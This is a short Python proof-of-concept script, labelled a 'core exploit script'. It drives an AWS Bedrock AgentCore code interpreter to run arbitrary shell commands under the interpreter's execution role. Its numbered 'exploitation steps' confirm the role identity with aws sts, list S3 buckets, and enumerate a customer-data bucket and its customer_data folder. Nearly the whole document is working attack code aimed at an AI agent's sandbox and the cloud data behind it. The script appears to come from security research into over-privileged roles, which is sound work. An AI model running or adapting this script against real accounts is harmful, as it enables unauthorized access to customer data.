#Core exploit script that directly invokes the Bedrock AgentCore code interpreter and executes AWS CLI commands under the interpreter’s execution role.

import boto3

# Initialize Bedrock AgentCore client
bedrock_agentcore_client = boto3.client('bedrock-agentcore')

# Replace with your actual interpreter ID
CODE_INTERPRETER_ID = "custom_agent_interpreter-2n0e6Fj63m"

# Start a code interpreter session
session = bedrock_agentcore_client.start_code_interpreter_session(
    codeInterpreterIdentifier=CODE_INTERPRETER_ID
)

session_id = session["sessionId"]

def run_command_and_print_results(command):
    """
    Sends arbitrary shell commands to the Bedrock AgentCore code interpreter
    and prints stdout/stderr from the execution environment.
    """
    response = bedrock_agentcore_client.invoke_code_interpreter(
        codeInterpreterIdentifier=CODE_INTERPRETER_ID,
        sessionId=session_id,
        name="executeCommand",
        arguments={"command": command}
    )

    for event in response["stream"]:
        stdout = event["result"]["structuredContent"].get("stdout")
        stderr = event["result"]["structuredContent"].get("stderr")

        if stdout:
            print(stdout)
        if stderr:
            print(stderr)

# --- Exploitation steps ---

# 1. Prove execution role context
run_command_and_print_results("PAGER=cat aws sts get-caller-identity")

# 2. Enumerate S3 access
run_command_and_print_results("PAGER=cat aws s3 ls")

# 3. List customer data bucket (replace with your bucket name)
run_command_and_print_results(
    "PAGER=cat aws s3 ls s3://bedrock-agentcore-customer-data-467608312035/"
)

# 4. Enumerate sensitive data
run_command_and_print_results(
    "PAGER=cat aws s3 ls s3://bedrock-agentcore-customer-data-467608312035/customer_data/"
)
